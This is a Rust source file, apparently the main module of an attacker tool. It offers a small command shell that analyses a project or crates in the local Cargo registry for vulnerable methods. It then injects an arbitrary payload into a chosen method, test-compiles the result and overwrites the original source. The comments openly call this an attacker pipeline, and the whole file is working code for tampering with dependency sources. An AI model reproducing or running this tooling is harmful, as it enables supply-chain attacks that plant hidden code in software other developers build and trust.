
// Mock shell that receives commands

// Define available commands and their I/O (integration requires that vanalyzer has been run before) and the context they should be called in
// (maybe inside a thread)


// Vanalyzer command
// vanalyzer <target-project-path> <target-username>
// runs the script vanalyzer/run.sh and stores its result in a variable (use Command crate opening
// a socket to get the output and deserialize it)
// Finally show the formatted output to the user with the vulnerable files ordered with its
// vulnerable methods listed as well

// Integrate command
// integrate <file_no> <method_no> <payload>
// copy-pastes the code from <payload> into <file_no> in the file's <method_no>'th method
// produce a mock result (duplicate the file with the integrated payload) and compile it to check
// nothing's wrong

// Ok command
// ok
// inject the code into the source file

// Atacker pipeline:
// 1. Run the mock shell (cargo project)
// 2. run vanalyzer command
// 3. run integrate command
// 4. run ok command

mod vanalyzer;
mod payload;
mod compilation;

use log::{error, info}; 
use std::path::Path;
use std::io::Write;

use vanalyzer::*;
use payload::*;
use compilation::*;

// Returns a rust program to be compiled afterwards
// Injects in the <file_selected> file at line <method_starting_line> the code for running
// <payload>
// <file_selected> has to be the absolute path to the file
fn integrate(file_selected: &String, method_starting_line: usize, payload: &dyn Payload) -> PayloadResult<String> {
   payload.inject(
       &std::fs::read_to_string(file_selected.clone()).unwrap() 
       , &method_starting_line
   )
}
// returns error if compilation was not successful
fn ok_command(comp_stat: &CompilationStatus) -> Result<(), String> {
    match comp_stat {
        CompilationStatus::Correct(prog, file) /* Merge file */ => {
            std::fs::OpenOptions::new()
                .truncate(true)
                .open(file)
                .unwrap()
                .write(prog.as_bytes())
                .unwrap();
            Ok(())
        },
        CompilationStatus::Flaw(e) => Err(format!("Error while compiling: {e}"))
    }
}

fn main() {
    // launch reader thread with socket fd
    let (tx, rx) = std::sync::mpsc::channel::<String>();
    std::thread::spawn(move || {
        loop {
            let stdin = std::io::stdin();
            let mut buf: String = "".to_string(); 
            match stdin.read_line(&mut buf) {
                Ok(_) => tx.send(buf).unwrap(),
                Err(_) => /* This should cause a dead end error */ { drop(tx); break;}
            }
        }
    });
    let mut va_output: Option<Vaoutput> = None;
    let mut comp_res: Option<CompilationStatus> = None;
    loop {
       match rx.try_recv().ok() {
           Some(cmd) => {
               let cmd_parts: Vec<&str> = cmd.split(' ').collect();
               match cmd_parts[0] {
                   "vanalyze" => {
                       info!("Running vanalyzer command");
                       match vanalyze(Path::new(&cmd_parts[1]), &cmd_parts[2]) {
                           Ok(vaout) => {va_output = Some(vaout)},
                           Err(e) => error!("Run vanalyzer again due to unexpected: {e}") 
                       }
                   },
                   "integrate" => {
                       info!("Running integrate command");
                       if let Some(ref va_out) = va_output {
                           let file_no = cmd_parts[1].parse::<usize>().unwrap();
                           let file_selected = va_out.nth_file(file_no.clone()).expect("Bad file number");
                           let method_sl = file_selected.nth_method_sl(
                        cmd_parts[2].parse::<usize>().unwrap()
                               ).expect("Bad method number");
                           let integrated_payload = integrate(
                                                &file_selected.name
                                                , method_sl.clone() 
                                                , payload_from_str(cmd_parts[3])
                           ).unwrap();
                           comp_res = Some(
                               compile_mock_integration(&integrated_payload
                               , va_out.nth_file_crate(file_no).expect("Bad file number") 
                               , &file_selected.name)
                            );
                       } else {
                           error!("You must run vanalyze command before");
                       }
                   },
                   "exploit" => { 
                       info!("Running exploit command"); 
                        // get method starting line
                        // read file until you hit with the method
                        let reader = std::fs::read_to_string(&cmd_parts[1].to_string()).unwrap();
                        let maybe_line =  reader.lines().enumerate().filter(|(_, line)| line.contains(" fn ") && line.contains(cmd_parts[2]) /* may not be exhaustive but dah */).collect::<Vec<(usize, &str)>>(); 

                        if maybe_line.len() > 0 {
                            let method_line = maybe_line[0].0;
                            let integrated_payload = integrate(
                                      &cmd_parts[1].to_string() 
                                      , method_line 
                                      , payload_from_str(cmd_parts[3])
                              );
                               // /home/username/.cargo/registry/src/*/crate_name/...
                               // crate's path ends at the 8th forslash
                               let (target_crate, target_file) = cmd_parts[1].match_indices('/').nth(7).map(|(index, _)| cmd_parts[1].split_at(index)).unwrap();
                               let target_file = target_file.replacen('/', "", 1);
                               comp_res = Some(
                                   compile_mock_integration(&integrated_payload.unwrap()
                                   , target_crate
                                   , &target_file)
                                );
                        } else {
                            error!("Method not found in specified file")
                        }
                        
                   },
                   "ok" => {
                       info!("Running ok command");
                       if let Some(ref compiled) = comp_res {
                           let _ = ok_command(compiled);
                           info!("Payload has been successfully injected");
                       } else {
                           error!("You must run integrate command before");
                          
                       }
                   },
                   _ => error!("Unknown command")
               }
           },
           None => ()
       }
    }
}
